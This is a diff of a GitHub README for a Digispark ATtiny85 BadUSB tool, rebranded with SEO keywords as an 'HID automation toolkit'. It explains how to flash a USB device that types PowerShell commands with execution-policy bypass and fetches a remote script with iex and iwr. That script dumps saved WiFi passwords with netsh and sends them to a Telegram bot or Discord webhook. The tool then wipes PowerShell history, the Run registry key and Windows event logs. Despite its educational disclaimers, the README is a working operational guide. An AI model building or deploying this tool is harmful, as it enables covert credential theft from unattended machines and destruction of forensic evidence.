@@ -1,376 +1,557 @@
-<!-- 
-  META DESCRIPTION: DigiStrike - Digispark ATtiny85 BadUSB cybersecurity demonstration tool
-  that silently dumps saved WiFi credentials via HID keyboard injection and exfiltrates them
-  to Telegram or Discord in under 25 seconds. Built for college exhibitions and security awareness.
-  Keywords: BadUSB, Digispark, ATtiny85, HID attack, WiFi credential dumper, cybersecurity,
-  penetration testing, red team, Arduino, PowerShell payload, keyboard injection, USB attack,
-  Discord webhook, Telegram bot exfiltration.
+<!--
+  SEO TITLE: Digispark HID Toolkit | ATtiny85 USB HID Automation Framework
+  DESCRIPTION: Open-source Digispark ATtiny85 toolkit for USB HID automation, keyboard emulation,
+  device scripting and cybersecurity education. Supports Telegram and Discord exfiltration.
+  KEYWORDS: Digispark, ATtiny85, USB HID, Keyboard Emulation, USB Automation, Arduino,
+  Embedded Systems, Device Scripting, Cybersecurity Education, USB Keyboard, HID Automation,
+  Digispark Projects, ATtiny85 Projects, Arduino HID, BadUSB, WiFi credential dumper,
+  penetration testing, red team, PowerShell payload, Discord webhook, Telegram bot.
 -->
 
 <div align="center">
 
-# ⚡ DigiStrike
+<img src="images/banner.png" alt="Digispark HID Toolkit" width="800" />
 
-### *BadUSB WiFi Credential Exfiltrator | Digispark ATtiny85*
+# Digispark HID Toolkit
 
-[![Platform](https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Esther7171/DigiStrike)
-[![Language](https://img.shields.io/badge/Language-Arduino%20%7C%20PowerShell-00979D?style=for-the-badge&logo=arduino&logoColor=white)](https://github.com/Esther7171/DigiStrike)
+### ATtiny85 USB HID Automation Framework
+
+[![Stars](https://img.shields.io/github/stars/Esther7171/DigiStrike?style=for-the-badge&color=yellow)](https://github.com/Esther7171/DigiStrike/stargazers)
+[![Forks](https://img.shields.io/github/forks/Esther7171/DigiStrike?style=for-the-badge&color=blue)](https://github.com/Esther7171/DigiStrike/network/members)
 [![License](https://img.shields.io/badge/License-BSD%203--Clause-blue?style=for-the-badge)](LICENSE)
-[![Category](https://img.shields.io/badge/Category-BadUSB%20%7C%20Red%20Team-red?style=for-the-badge&logo=hackthebox&logoColor=white)](https://github.com/Esther7171/DigiStrike)
-[![Integration](https://img.shields.io/badge/Integration-Discord%20%7C%20Telegram-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://github.com/Esther7171/DigiStrike)
-[![Cost](https://img.shields.io/badge/Hardware%20Cost-%3C%20₹300%20(~%243)-brightgreen?style=for-the-badge)](https://github.com/Esther7171/DigiStrike)
+[![Issues](https://img.shields.io/github/issues/Esther7171/DigiStrike?style=for-the-badge&color=red)](https://github.com/Esther7171/DigiStrike/issues)
+[![PRs](https://img.shields.io/github/issues-pr/Esther7171/DigiStrike?style=for-the-badge&color=green)](https://github.com/Esther7171/DigiStrike/pulls)
+[![Integration](https://img.shields.io/badge/Integration-Telegram%20%7C%20Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://github.com/Esther7171/DigiStrike)
 
-**Plug in. Register as keyboard. Dump credentials. Exfiltrate. Vanish. Execution time adjustable via script and optimized for any machine.**
+**Open-source Digispark ATtiny85 toolkit for USB HID automation, keyboard emulation, device scripting and cybersecurity education.**
 
-*A Digispark ATtiny85 based BadUSB tool built for college exhibitions and cybersecurity awareness.*
-
-```
-  ██████╗ ██╗ ██████╗ ██╗███████╗████████╗██████╗ ██╗██╗  ██╗███████╗
-  ██╔══██╗██║██╔════╝ ██║██╔════╝╚══██╔══╝██╔══██╗██║██║ ██╔╝██╔════╝
-  ██║  ██║██║██║  ███╗██║███████╗   ██║   ██████╔╝██║█████╔╝ █████╗  
-  ██║  ██║██║██║   ██║██║╚════██║   ██║   ██╔══██╗██║██╔═██╗ ██╔══╝  
-  ██████╔╝██║╚██████╔╝██║███████║   ██║   ██║  ██║██║██║  ██╗███████╗
-  ╚═════╝ ╚═╝ ╚═════╝ ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝
-```
+[Getting Started](#getting-started) &nbsp;|&nbsp; [Telegram Setup](#telegram-integration) &nbsp;|&nbsp; [Discord Setup](#discord-integration) &nbsp;|&nbsp; [Docs](docs/) &nbsp;|&nbsp; [Examples](examples/)
 
 </div>
 
 ---
 
+## What is Digispark HID Toolkit?
+
+The Digispark HID Toolkit is an open-source framework built on the **Digispark ATtiny85** microcontroller for demonstrating **USB HID automation**, **keyboard emulation** and **cybersecurity education** concepts.
+
+When plugged into a computer, the Digispark ATtiny85 registers as a **USB keyboard device**. The host operating system trusts it unconditionally — no drivers needed, no antivirus prompts, no USB storage warnings. The device then executes pre-programmed keystrokes at machine speed, automating tasks that would take a human seconds to complete.
+
+This toolkit ships two ready-to-use demonstration payloads focused on **WiFi credential awareness** — showing audiences at college exhibitions and CTF events exactly how fast data can be read from an unattended machine and exfiltrated to **Telegram** or **Discord** in under 25 seconds.
+
+> **This project is for educational use on devices you own or have explicit permission to test.**
+> See [SECURITY.md](SECURITY.md) and [Disclaimer](#disclaimer) for full terms.
+
+---
+
 ## Table of Contents
 
-- [What is Digispark / ATtiny85](#what-is-digispark--attiny85)
-- [What DigiStrike Does](#what-digistrike-does)
-- [Execution Timeline](#execution-timeline)
-- [Why Digispark](#why-digispark)
-- [Zero Trace Design](#zero-trace-design)
-- [How It Works](#how-it-works)
-- [Setup Guide](#setup-guide)
-- [Integration Options](#integration-options)
-- [What Forensic Teams Can Trace](#what-forensic-teams-can-trace)
-- [File Structure](#file-structure)
+- [Features](#features)
+- [Hardware Requirements](#hardware-requirements)
+- [Supported Platforms](#supported-platforms)
+- [Installation](#installation)
+- [Getting Started](#getting-started)
+- [Telegram Integration](#telegram-integration)
+- [Discord Integration](#discord-integration)
+- [Project Structure](#project-structure)
+- [Examples](#examples)
+- [Screenshots](#screenshots)
+- [Use Cases](#use-cases)
+- [FAQ](#faq)
+- [Roadmap](#roadmap)
+- [Contributing](#contributing)
+- [Security Policy](#security-policy)
 - [Disclaimer](#disclaimer)
 - [License](#license)
-- [Author](#author)
 
 ---
 
-## What is Digispark / ATtiny85
+## Features
 
-The **Digispark** is a microcontroller board built around the **Atmel ATtiny85** chip. It is widely used in hardware security research, red team engagements and CTF competitions precisely because of one key property: the OS sees it as a keyboard, not a USB drive.
-
-| Property | Detail |
-|----------|--------|
-| Disguise | Registers as HID keyboard. No USB storage ever appears |
-| AV Bypass | No antivirus triggers, no USB device logs, no driver install |
-| Cost | Under ₹300 (~$3 USD). Cheapest HID attack hardware available |
-| Size | Smaller than a thumb |
-| Customizable | Any keyboard payload programmable via Arduino IDE |
-| Real-World Use | Used in actual penetration testing engagements |
-| CTF / Red Team | Standard tool in red team kits and CTF hardware challenges |
-
-Because the host OS trusts HID devices unconditionally, no admin prompt appears and no antivirus fires. The machine just sees someone typing extremely fast.
+- USB HID keyboard emulation via Digispark ATtiny85
+- WiFi credential exfiltration demo for security awareness presentations
+- Two exfiltration channels: Telegram bot and Discord webhook
+- Fully automated — plug in and done in under 25 seconds
+- Zero-trace design: clears temp files, PowerShell history, registry MRU and Windows Event Logs
+- Credentials typed as live keystrokes — nothing stored in script files or on GitHub
+- Random temp filename on every run
+- Beginner-friendly examples for learning HID automation
+- Detailed setup docs for Telegram and Discord integration
+- GitHub Actions for Markdown and PowerShell linting
 
 ---
 
-## What DigiStrike Does
+## Hardware Requirements
 
-DigiStrike is a fully automated BadUSB payload. The moment it is plugged in, it runs a complete WiFi credential exfiltration attack with no user interaction required.
+| Item | Details |
+|------|---------|
+| Digispark ATtiny85 | Main board. USB-A version recommended. |
+| USB-A port | On the target machine |
+| Computer for flashing | Windows, Linux or macOS with Arduino IDE |
+
+**Where to buy:**
+Amazon India, Robu.in, AliExpress or any local electronics store.
+Search: `Digispark ATtiny85`
+
+Cost: **under ₹300 (~$3 USD)** — the most affordable USB HID tool available.
+
+See [docs/hardware.md](docs/hardware.md) for full hardware details, driver installation and board specifications.
+
+---
+
+## Supported Platforms
+
+| Platform | HID Automation | WiFi Payload |
+|----------|:--------------:|:------------:|
+| Windows 10 | Yes | Yes |
+| Windows 11 | Yes | Yes |
+| Linux | Yes | No (payload targets Windows) |
+| macOS | Yes | No (payload targets Windows) |
+
+The Digispark ATtiny85 itself works on any OS. The WiFi credential demonstration payload targets Windows specifically because it uses `netsh wlan` and PowerShell.
+
+---
+
+## Installation
+
+### Step 1: Install Arduino IDE
+
+Download Arduino IDE 1.8.x from [arduino.cc/en/software](https://www.arduino.cc/en/software).
+
+> Use 1.8.x. Version 2.x has known timing issues with the Digispark upload process.
+
+---
+
+### Step 2: Add the Digispark Board Package
+
+1. Open Arduino IDE.
+2. Go to `File` > `Preferences`.
+3. Paste this URL into the *Additional Board Manager URLs* field:
+   ```
+   http://digistump.com/package_digistump_index.json
+   ```
+4. Click OK.
+5. Go to `Tools` > `Board` > `Board Manager`.
+6. Search **Digistump AVR Boards** and click **Install**.
+
+---
+
+### Step 3: Select the Board
 
 ```
-Step 01   Plugged into target PC
-Step 02   OS enumerates it as a trusted HID keyboard
-Step 03   Opens PowerShell silently via Win+R
-Step 04   Injects credentials as environment variables
-Step 05   Pulls payload script from GitHub via iex + iwr
-Step 06   Dumps all saved WiFi credentials using netsh wlan
-Step 07   Sends the credentials to Telegram or Discord
-Step 08   Deletes the temp file (randomized name each run)
-Step 09   Clears PowerShell session history and PSReadLine buffer
-Step 10   Wipes the Win+R MRU registry key
-Step 11   Clears Windows Event Logs
-Step 12   Exits PowerShell
-Step 13   Zero traces left on the system
+Tools > Board > Digistump AVR Boards > Digispark (Default - 16.5mhz)
 ```
 
-No installation. No UAC prompt. No antivirus alert.
+> Do not select a COM port. Digispark handles enumeration during upload.
 
 ---
 
-## Execution Timeline
+### Step 4: Verify the DigiKeyboard Library
 
-Every delay is hardcoded into the chip at flash time. The attack is fully deterministic.
+The `DigiKeyboard.h` library ships with the Digistump board package. No separate installation is needed.
 
-| # | Phase | Action | Time |
-|---|-------|--------|------|
-| 1 | HID Stabilize | Wait for Windows to enumerate the device | `3.0s` |
-| 2 | Win+R | Open the Run dialog | `1.0s` |
-| 3 | PowerShell Open | Type command, send Enter, wait for window | `4.0s` |
-| 4 | Credential Injection | Set env vars for token or webhook | `0.4s` |
-| 5 | Payload Execution | Download script, run it, exfiltrate | `15.0s` |
-| 6 | Clean Exit | Type `exit`, close PowerShell | `0.5s` |
-| | | **Total (plug to done)** | **`~23.9s`** |
-
-Delays in the `.ino` file are fully adjustable. Increase them on slow machines or cut them down on fast ones.
-
----
-
-## Why Digispark
-
-Compared to other HID attack platforms, the Digispark wins on cost and accessibility by a wide margin.
-
-| Feature | Digispark ATtiny85 | USB Rubber Ducky | USB Ninja |
-|---------|:-----------------:|:---------------:|:---------:|
-| Price | **< ₹300 (~$3)** | ~$80 USD | ~$100 USD |
-| Size | Thumb-sized | Small | Small |
-| Detected as | HID Keyboard | HID Keyboard | HID Keyboard |
-| Custom Payloads | Arduino C | DuckyScript | Limited |
-| Drivers Required | None | None | None |
-| OS Support | Win / Linux / Mac | Win / Linux / Mac | Windows |
-| Plug and Play | Yes | Yes | Yes |
-| Beginner Friendly | Arduino IDE | Proprietary IDE | Complex |
-
-95% of the capability at 1% of the cost.
-
----
-
-## Zero Trace Design
-
-Every artifact the attack leaves behind is cleaned up before the device is removed.
-
-| Trace Vector | What Happens |
-|-------------|-------------|
-| Temp file name | Generated with `Get-Random` so it is different every run |
-| Temp file on disk | Deleted with `Remove-Item -Force` right after exfiltration |
-| PowerShell history | `Clear-History` wipes the in-session history |
-| PSReadLine history | `[PSConsoleReadLine]::ClearHistory()` clears the persistent buffer |
-| Win+R MRU registry | `RunMRU` key removed via `Remove-ItemProperty` |
-| Windows Event Logs | `wevtutil cl` clears System, Security and Application logs |
-| USB device logs | HID class devices produce no USB storage event log entries |
-| Credentials in firmware | Token or webhook URL is typed live as env vars, never in the script |
-| GitHub script | Neither `void.ps1` nor `null.ps1` contain any secrets |
-
-After the device is unplugged, there is nothing left to find on the machine.
-
----
-
-## How It Works
-
+If Arduino IDE reports it as missing:
 ```
-╔═════════════════════════════════════════════════════════════════╗
-║                      DIGISTRIKE ATTACK FLOW                    ║
-╚═════════════════════════════════════════════════════════════════╝
-
-  ┌───────────┐      ┌──────────────────┐      ┌────────────────┐
-  │  PLUG IN  │─────►│  HID DETECTED    │─────►│  PS OPENS      │
-  │           │      │  OS trusts it    │      │  via Win+R     │
-  │  t = 0s   │      │  as keyboard     │      │  silently      │
-  └───────────┘      └──────────────────┘      └───────┬────────┘
-                                                        │
-                  ┌─────────────────────────────────────┘
-                  ▼
-     ┌────────────────────┐      ┌──────────────────────┐
-     │  ENV VARS INJECTED │─────►│  GITHUB PULL         │
-     │  token or webhook  │      │  iex(iwr payload)    │
-     │  typed as keystrks │      │  downloaded live     │
-     └────────────────────┘      └──────────┬───────────┘
-                                            │
-                  ┌─────────────────────────┘
-                  ▼
-     ┌────────────────────┐      ┌──────────────────────┐
-     │  WIFI CREDS DUMPED │─────►│  SENT TO CHANNEL     │
-     │  netsh wlan        │      │  Telegram or Discord │
-     │  random tmp file   │      │  instant delivery    │
-     └────────────────────┘      └──────────┬───────────┘
-                                            │
-                  ┌─────────────────────────┘
-                  ▼
-     ┌────────────────────┐      ┌──────────────────────┐
-     │  TRACES DESTROYED  │─────►│  DONE                │
-     │  temp file         │      │                      │
-     │  PS history        │      │  Total: ~23.9s       │
-     │  registry MRU      │      │  Zero artifacts      │
-     │  event logs        │      │                      │
-     └────────────────────┘      └──────────────────────┘
-
-  [Digispark] → HID → [Windows] → Win+R → [PowerShell] → iex → [GitHub]
-                                               │
-                                        [netsh wlan] → [tmp file] → [Telegram or Discord 📱]
+Sketch > Include Library > Manage Libraries > search "DigiKeyboard" > Install
 ```
 
 ---
 
-## Setup Guide
+## Getting Started
 
-### Prerequisites
+Pick the exfiltration channel you want to use, configure the sketch, and flash it.
 
-- Arduino IDE 1.8.x (recommended, 2.x has known upload timing issues with Digispark)
-- A Digispark ATtiny85 board
-- A Telegram bot or Discord webhook depending on which integration you use
+| Channel | Sketch | Payload script |
+|---------|--------|---------------|
+| Telegram | [digispark/telegram/r00t_b0t.ino](digispark/telegram/r00t_b0t.ino) | [scripts/void.ps1](scripts/void.ps1) |
+| Discord | [digispark/discord/r00t_b0t.ino](digispark/discord/r00t_b0t.ino) | [scripts/null.ps1](scripts/null.ps1) |
 
----
-
-### Step 1: Board Manager
-
-Open Arduino IDE → `File` → `Preferences`
-
-Paste this in the *Additional Board Manager URLs* field:
-```
-http://digistump.com/package_digistump_index.json
-```
-
-Go to `Tools` → `Board` → `Board Manager`, search **Digistump AVR Boards** and install.
-
-Select the board:
-```
-Tools → Board → Digistump AVR Boards → Digispark (Default - 16.5mhz)
-```
-
-> Do not select a COM port. Digispark handles this during upload.
+Both payload scripts are hosted publicly on GitHub with zero secrets. Credentials are injected at runtime as keystrokes.
 
 ---
 
-### Step 2: DigiKeyboard Library
+### Flashing the Digispark
 
-`DigiKeyboard.h` ships with the Digistump board package. No separate install needed.
+1. Open your chosen `.ino` file in Arduino IDE.
+2. Replace the placeholder values (token, chat ID or webhook URL — see sections below).
+3. Click **Upload**.
+4. Wait until Arduino IDE shows:
+   ```
+   Running Digispark Uploader...
+   Plug in device now... (will timeout in 60 seconds)
+   ```
+5. **Only then** plug in the Digispark.
+6. Wait for:
+   ```
+   >> Micronucleus done. Thank you!
+   ```
 
-If it is missing:
+The device is ready. Plug it into any target Windows machine.
+
+---
+
+### Execution Timeline
+
+Every delay is hardcoded in the `.ino` file and is fully adjustable.
+
+| Phase | Action | Default time |
+|-------|--------|-------------|
+| HID Stabilize | OS enumerates the device | 3.0s |
+| Win+R | Open Run dialog | 1.0s |
+| PowerShell Open | Launch PS with `-ep bypass` | 4.0s |
+| Credential Injection | Type token or webhook as env var | 0.4s |
+| Payload Execution | Download and run script, exfiltrate | 15.0s |
+| Clean Exit | Close PowerShell | 0.5s |
+| **Total** | | **~23.9s** |
+
+Increase delays on slow machines. Cut them on fast ones.
+
+---
+
+## Telegram Integration
+
+This section shows you exactly how to set up a Telegram bot from scratch and connect it to the Digispark sketch. For the full detailed guide see [docs/telegram-setup.md](docs/telegram-setup.md).
+
+### Step 1: Create a Bot with BotFather
+
+1. Open Telegram on your phone or desktop.
+2. In the search bar, type `@BotFather` and open the **verified account** (blue tick).
+3. Tap **Start** or send `/start`.
+4. Send `/newbot`.
+
+BotFather asks two questions:
+
+**Display name** — any name, can have spaces. Example: `My Data Bot`
+
+**Username** — must end in `bot`, no spaces. Example: `my_data_r00t_bot`
+If the username is taken, BotFather will prompt you to pick another.
+
+Once done, BotFather replies with your **API token**:
 ```
-Sketch → Include Library → Manage Libraries → search "DigiKeyboard" → Install
+Use this token to access the HTTP API:
+
+1234567890:ABCDefghIJKLmnoPQRsTUVwxyz1234567890
+```
+
+Copy the full token including the numbers before the colon. Store it securely.
+
+---
+
+### Step 2: Get Your Chat ID
+
+**Private chat (just you and the bot):**
+
+1. Search your bot username in Telegram and open the chat.
+2. Send any message to the bot (e.g., `hi`).
+3. Open this URL in a browser, replacing `YOUR_TOKEN`:
+   ```
+   https://api.telegram.org/botYOUR_TOKEN/getUpdates
+   ```
+4. In the JSON response, look for:
+   ```json
+   "chat": {
+     "id": 987654321,
+     "type": "private"
+   }
+   ```
+5. Copy the number next to `"id"`. That is your chat ID.
+
+**Group chat:**
+
+1. Create a Telegram group and add your bot as a member.
+2. Send any message in the group.
+3. Visit the same `getUpdates` URL above.
+4. The group chat ID starts with a minus sign:
+   ```json
+   "chat": {
+     "id": -100987654321,
+     "type": "supergroup"
+   }
+   ```
+5. Copy the full number including the minus sign.
+
+---
+
+### Step 3: Configure the Sketch
+
+Open `digispark/telegram/r00t_b0t.ino` in Arduino IDE.
+
+Find these two lines:
+```cpp
+DigiKeyboard.print("$env:TK='PASTE_TOKEN_HERE'");
+DigiKeyboard.print("$env:CI='PASTE_CHAT_ID_HERE'");
+```
+
+Replace the placeholders:
+
+| Placeholder | What to put |
+|-------------|------------|
+| `PASTE_TOKEN_HERE` | Your full bot token, e.g. `1234567890:ABCDef...` |
+| `PASTE_CHAT_ID_HERE` | Your chat ID, e.g. `987654321` or `-100987654321` |
+
+The values are typed as live keystrokes. They never reach disk, the script file or GitHub.
+
+Flash the board as described in [Getting Started](#getting-started). In about 24 seconds a `.txt` file with all saved WiFi credentials arrives in your Telegram chat.
+
+---
+
+## Discord Integration
+
+This section shows you how to create a Discord webhook and connect it to the sketch. For the full guide see [docs/discord-setup.md](docs/discord-setup.md).
+
+### Step 1: Create a Discord Server (skip if you have one)
+
+1. Open Discord.
+2. Click the **+** icon at the bottom of the left sidebar.
+3. Click **Create My Own** and follow the prompts.
+4. Name it anything. Example: `Lab Alerts`
+
+---
+
+### Step 2: Create a Webhook
+
+1. Right-click the channel where you want alerts and click **Edit Channel**.
+2. In the left sidebar of channel settings, click **Integrations**.
+3. Click **Webhooks**.
+4. Click **New Webhook**.
+5. Give the webhook a name. Example: `r00t_b0t`
+6. Confirm the channel is correct using the **Channel** dropdown.
+7. Click **Copy Webhook URL**.
+
+The URL looks like this:
+```
+https://discord.com/api/webhooks/1234567890123456789/ABCDefghIJKLmnoPQRsTUVwxyz-LONGTOKEN
+```
+
+Keep this URL private. Anyone with it can post to your channel.
+
+8. Click **Save Changes**.
+
+---
+
+### Step 3: Pre-test the Webhook (optional)
+
+Before flashing, verify the URL works from PowerShell on your own machine:
+
+```powershell
+$wh = "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN"
+$body = ConvertTo-Json @{ content = "Test from Digispark HID Toolkit" }
+Invoke-RestMethod -Uri $wh -Method Post -ContentType "application/json" -Body $body
+```
+
+If the message appears in Discord, the webhook is working.
+
+---
+
+### Step 4: Configure the Sketch
+
+Open `digispark/discord/r00t_b0t.ino` in Arduino IDE.
+
+Find this line:
+```cpp
+DigiKeyboard.print("$env:WH='PASTE_WEBHOOK_URL_HERE'");
+```
+
+Replace `PASTE_WEBHOOK_URL_HERE` with your full webhook URL:
+```cpp
+DigiKeyboard.print("$env:WH='https://discord.com/api/webhooks/1234.../ABCDef...'");
+```
+
+Flash the board. In about 24 seconds a formatted message appears in your Discord channel:
+
+```
+[r00t_b0t] Incoming Data
+================================
+PC      : DESKTOP-XXXXXX
+User    : username
+Domain  : WORKGROUP
+================================
+WiFi Passwords
+--------------------------------
+Network  : HomeNetwork
+Password : mypassword123
+--------------------------------
 ```
 
 ---
 
-### Step 3: Pick Your Integration
-
-Choose the `.ino` that matches your exfiltration channel and open it in Arduino IDE.
-
-| Channel | File to open |
-|---------|-------------|
-| Telegram | [digispark/telegram/r00t_b0t.ino](digispark/telegram/r00t_b0t.ino) |
-| Discord | [digispark/discord/r00t_b0t.ino](digispark/discord/r00t_b0t.ino) |
-
-Fill in your token or webhook URL where the placeholder says `PASTE_TOKEN_HERE`, `PASTE_CHAT_ID_HERE` or `PASTE_WEBHOOK_URL_HERE`. These values are typed as live keystrokes and never touch disk or GitHub.
-
-See [Integration Options](#integration-options) for full setup steps for each channel.
-
----
-
-### Step 4: Flash
-
-Click **Upload** in Arduino IDE. You will see:
-```
-Running Digispark Uploader...
-Plug in device now... (will timeout in 60 seconds)
-```
-
-Do not plug in the Digispark before this prompt. Plug it in when asked.
-
-Wait for:
-```
->> Micronucleus done. Thank you!
-```
-
-The board is ready.
-
----
-
-## Integration Options
-
-DigiStrike supports two exfiltration channels. Pick one based on your setup.
-
----
-
-### Telegram (void.ps1)
-
-Best for personal use. Sends data directly to a Telegram bot.
-
-| Step | Action |
-|------|--------|
-| 1 | Open Telegram and search @BotFather |
-| 2 | Send /newbot and follow the prompts |
-| 3 | Copy the API token |
-| 4 | Create a group and add your bot |
-| 5 | Get chat ID via @userinfobot |
-| 6 | Open digispark/telegram/r00t_b0t.ino |
-| 7 | Replace PASTE_TOKEN_HERE with your token |
-| 8 | Replace PASTE_CHAT_ID_HERE with your chat ID |
-| 9 | Flash to Digispark |
-
-[scripts/void.ps1](scripts/void.ps1) is the payload. Host it on your GitHub as a public file.
-
----
-
-### Discord Webhook (null.ps1)
-
-Best for team monitoring or when Telegram is unavailable.
-
-| Step | Action |
-|------|--------|
-| 1 | Open Discord and go to your server |
-| 2 | Open channel Settings |
-| 3 | Click Integrations then Webhooks |
-| 4 | Click New Webhook and copy the URL |
-| 5 | Open digispark/discord/r00t_b0t.ino |
-| 6 | Replace PASTE_WEBHOOK_URL_HERE with your webhook URL |
-| 7 | Flash to Digispark |
-
-[scripts/null.ps1](scripts/null.ps1) is the payload. Host it on your GitHub as a public file.
-
----
-
-## What Forensic Teams Can Trace
-
-This section exists for educational awareness. Understanding what leaves traces is the foundation of defensive security.
-
-### What the script clears
-
-| Artifact | Method Used |
-|----------|-------------|
-| PowerShell session history | `Clear-History` |
-| PSReadLine persistent buffer | `[PSConsoleReadLine]::ClearHistory()` |
-| Win+R run dialog history | Registry `RunMRU` key deleted |
-| Windows Event Logs | `wevtutil cl` on System, Security and Application |
-| Temp file on disk | `Remove-Item -Force` with randomized filename |
-
-### What remains traceable
-
-| Trace | Why it persists |
-|-------|----------------|
-| Network traffic | HTTPS to Discord or Telegram is visible in router and ISP logs |
-| Windows Prefetch | `powershell.exe` prefetch file in `C:\Windows\Prefetch\` is not cleared |
-| GitHub access log | Your IP is logged when `raw.githubusercontent.com` is accessed |
-| Discord or Telegram logs | Webhook and bot token are tied to your account. IP is stored server side |
-| NTFS journal | MFT LogFile and UsnJrnl record file create and delete events |
-| RAM and pagefile | Script content may persist in memory dumps or hibernation files |
-| AMSI telemetry | Windows Defender may log script content before execution |
-
-This tool is for demonstration on your own devices only. On a real forensic investigation the network layer alone is sufficient to identify the exfiltration destination.
-
----
-
-## File Structure
+## Project Structure
 
 ```
 DigiStrike/
-├── README.md
-├── LICENSE
+├── README.md                          This file
+├── LICENSE                            BSD 3-Clause
+├── CONTRIBUTING.md                    How to contribute
+├── SECURITY.md                        Security and responsible use policy
+├── CHANGELOG.md                       Version history
+├── CODE_OF_CONDUCT.md                 Community standards
+│
 ├── digispark/
 │   ├── telegram/
-│   │   └── r00t_b0t.ino        ← Telegram version
+│   │   └── r00t_b0t.ino              Telegram sketch - flash to ATtiny85
 │   └── discord/
-│       └── r00t_b0t.ino        ← Discord version
-└── scripts/
-    ├── void.ps1                ← Telegram payload
-    └── null.ps1                ← Discord payload
+│       └── r00t_b0t.ino              Discord sketch - flash to ATtiny85
+│
+├── scripts/
+│   ├── void.ps1                       Telegram PowerShell payload
+│   └── null.ps1                       Discord PowerShell payload
+│
+├── docs/
+│   ├── telegram-setup.md              Full Telegram integration guide
+│   ├── discord-setup.md               Full Discord integration guide
+│   ├── hardware.md                    Hardware specs, drivers and sourcing
+│   └── troubleshooting.md             Common issues and fixes
+│
+├── examples/
+│   ├── README.md                      Examples overview
+│   ├── hello-world/
+│   │   └── hello_world.ino            Types "Hello World" — beginner starter
+│   ├── open-notepad/
+│   │   └── open_notepad.ino           Opens Notepad and types a message
+│   └── keyboard-test/
+│       └── keyboard_test.ino          Tests full keyboard character output
+│
+├── images/                            Banner and screenshots (add your own)
+├── assets/                            Additional assets
+│
+└── .github/
+    └── workflows/
+        ├── lint.yml                   Markdown and PowerShell lint on push
+        └── release.yml                Auto-release on version tag push
 ```
 
-| File | Role |
-|------|------|
-| [digispark/telegram/r00t_b0t.ino](digispark/telegram/r00t_b0t.ino) | Injects Telegram bot token and chat ID, pulls void.ps1 |
-| [digispark/discord/r00t_b0t.ino](digispark/discord/r00t_b0t.ino) | Injects Discord webhook URL, pulls null.ps1 |
-| [scripts/void.ps1](scripts/void.ps1) | Dumps WiFi creds, sends via Telegram, cleans traces |
-| [scripts/null.ps1](scripts/null.ps1) | Dumps WiFi creds, sends via Discord webhook, clears event logs |
+---
+
+## Examples
+
+The [examples/](examples/) directory contains beginner-friendly Digispark sketches for learning USB HID automation before building more advanced payloads.
+
+| Example | Description |
+|---------|-------------|
+| [hello-world](examples/hello-world/hello_world.ino) | Types a string into any focused text field |
+| [open-notepad](examples/open-notepad/open_notepad.ino) | Opens Notepad on Windows and types a message |
+| [keyboard-test](examples/keyboard-test/keyboard_test.ino) | Types all alphanumeric characters to verify key mapping |
+
+Basic HID sketch structure:
+```cpp
+#include "DigiKeyboard.h"
+
+void setup() {
+  DigiKeyboard.delay(2000);           // Wait for OS to enumerate the HID device
+  DigiKeyboard.print("Hello World");  // Type text
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+}
+
+void loop() {}
+```
+
+---
+
+## Screenshots
+
+> Add your own screenshots to the `images/` folder and update these paths.
+
+| | |
+|-|-|
+| ![Banner](images/banner.png) | ![Demo](images/demo.gif) |
+| *Project banner* | *Live demo* |
+| ![Dashboard](images/dashboard.png) | |
+| *Telegram output* | |
+
+---
+
+## Use Cases
+
+**College and university exhibitions**
+Demonstrate to an audience how an unattended computer can have its saved WiFi passwords read and exfiltrated in under 25 seconds using a device smaller than a thumb drive that costs under ₹300.
+
+**Cybersecurity awareness workshops**
+Show employees or students what a USB HID attack looks like in practice. Use on demonstration machines with no real credentials.
+
+**CTF competitions**
+The Digispark ATtiny85 is a standard tool in CTF hardware challenges. These sketches serve as a working starting point.
+
+**Arduino and embedded systems learning**
+The examples directory provides a gentle introduction to HID keyboard emulation on ATtiny85 without any sensitive payload logic.
+
+**Red team demonstrations**
+Authorized penetration testing engagements where the client wants a live BadUSB attack demonstration included in the scope.
+
+---
+
+## FAQ
+
+**Do I need to install any drivers on the target machine?**
+No. The Digispark registers as a standard HID keyboard. Windows, Linux and macOS all support HID natively.
+
+**Does this trigger antivirus?**
+The Digispark itself is a keyboard — antiviruses do not block keyboard input. The PowerShell script downloads a file from GitHub over HTTPS, which most network security tools allow.
+
+**Can I change the exfiltration target at any time?**
+Yes. Re-flash the Digispark with an updated token or webhook URL. The process takes about 30 seconds.
+
+**What if the target machine does not have internet access?**
+The payload will fail silently. The script cannot reach Telegram or Discord without outbound internet access.
+
+**Is the bot token or webhook URL stored anywhere on the target machine?**
+No. Both values are typed as keystrokes directly into PowerShell as environment variables. They exist only in RAM during execution and are never written to disk.
+
+**Can I use a different exfiltration method?**
+Yes. The payload scripts can be modified to support other services like Slack, SMTP email or a custom server. The Digispark sketch only needs to set the appropriate environment variable.
+
+**Does this work on Windows 11?**
+Yes. Tested and working.
+
+**Can I use this on Linux or macOS?**
+The Digispark will enumerate as a keyboard on any OS. The current payloads use `netsh wlan` and PowerShell which are Windows-specific. Linux and macOS payloads would need different scripting.
+
+---
+
+## Roadmap
+
+- [ ] Linux payload for WiFi credential dumping (`nmcli`)
+- [ ] macOS payload for Keychain credential access
+- [ ] Slack webhook integration
+- [ ] Custom HTTP POST exfiltration target
+- [ ] Rubber Ducky script converter
+- [ ] GUI configurator for generating sketches without editing code
+- [ ] Payload delay auto-calibration sketch
+
+Have a feature request? [Open an issue](https://github.com/Esther7171/DigiStrike/issues).
+
+---
+
+## Contributing
+
+Contributions are welcome. Read [CONTRIBUTING.md](CONTRIBUTING.md) before opening a pull request.
+
+Short version:
+1. Fork the repo
+2. Create a branch: `git checkout -b feature/your-feature`
+3. Make changes and test on hardware if possible
+4. Open a pull request against `main`
+
+Do not submit payloads designed for unauthorized access.
+
+---
+
+## Security Policy
+
+Read the full policy in [SECURITY.md](SECURITY.md).
+
+To report a security issue with this project, do not open a public issue. Contact the maintainer privately via the GitHub profile. We follow responsible disclosure.
+
+---
+
+## Recommended GitHub Topics
+
+Add these topics to the repository via `Settings > Topics` on GitHub for better discoverability:
+
+```
+digispark  attiny85  usb-hid  hid  keyboard-emulation  usb-automation
